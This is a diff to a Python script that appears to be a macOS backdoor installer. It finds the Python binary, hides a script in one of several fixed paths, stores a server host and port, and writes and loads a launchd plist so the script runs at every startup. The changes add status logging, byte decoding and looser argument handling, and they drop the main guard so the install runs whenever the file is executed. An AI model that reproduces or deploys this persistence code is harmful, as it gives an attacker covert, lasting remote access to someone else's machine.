@@ -1,7 +1,6 @@
 import getpass
 import os
 import subprocess
-import shutil
 import sys
 import platform
 
@@ -59,13 +58,18 @@ def install_and_run_osx(host, port):
     :param host: server host addr
     :param port: server port
     """
+    print("[*] Installing on OSX")
     # Find python
     proc = subprocess.Popen(["which", "python"], stdout=subprocess.PIPE)
     (out, err) = proc.communicate()
     if err is not None:
         return False
-    python_path = out.strip()
+    try:
+        python_path = str(out.decode('utf-8')).strip()
+    except:
+        python_path = str(out).strip()
 
+    print("Python path:\t{}".format(python_path))
     # First find a location for the script
     script_path = None
     for loc in SCRIPT_LOCS:
@@ -77,9 +81,14 @@ def install_and_run_osx(host, port):
                 if err is not None:
                     print(err)
                     raise Exception(err)
+                print("[+] Script written to:\t{}".format(script_path))
             except Exception as e:
                 print(e)
+        else:
+            print("[*] Script exists in path:\t{}".format(script_path))
+            break
     if script_path is None:
+        print("[!] No suitable path found")
         return False
     # Install host information
     script_dir = os.path.dirname(script_path)
@@ -91,18 +100,22 @@ def install_and_run_osx(host, port):
         sys.stderr.write("[!] Could not write to " + HOSTINFOFILE)
 
     # Now we have hidden the script
+
     for loc in STARTUP_LOCS:
         daemon_loc = os.path.join(os.path.expanduser(loc), DAEMON_NAME)
         if not os.path.exists(daemon_loc):
             try:
+                print("[*] Attempting to write PLIST:\t{}".format(daemon_loc))
                 with open(daemon_loc, "w") as f:
                     f.write(STARTUP_PLIST.format(python_path=python_path,
                                                  script_path=script_path,
                                                  pwd=os.path.dirname(script_path)))
                 os.system('launchctl load -w '+daemon_loc)
+                print("[+] PLIST written")
                 return True
-            except:
-                pass
+            except Exception as e:
+                print(e)
+    print("[-] PLIST not written")
     return False
 
 def getInfo():
@@ -114,12 +127,15 @@ def getInfo():
         arch = platform.system() + " " + platform.release()
     return user, arch
 
-if __name__ == "__main__":
-    user, arch = getInfo()
-    hostaddr = HOST
-    hostport = PORT
-    if len(sys.argv) > 1:
-        hostaddr = sys.argv[1]
-        hostport = sys.argv[2]
-    if arch.startswith('OSX'):
-        install_and_run_osx(hostaddr,hostport)
+user, arch = getInfo()
+hostaddr = HOST
+hostport = PORT
+if len(sys.argv) > 1:
+    hostaddr = sys.argv[1]
+if len(sys.argv) > 2:
+    hostport = sys.argv[2]
+
+if arch.startswith('OSX'):
+    install_and_run_osx(hostaddr,hostport)
+else:
+    print("Non supported")
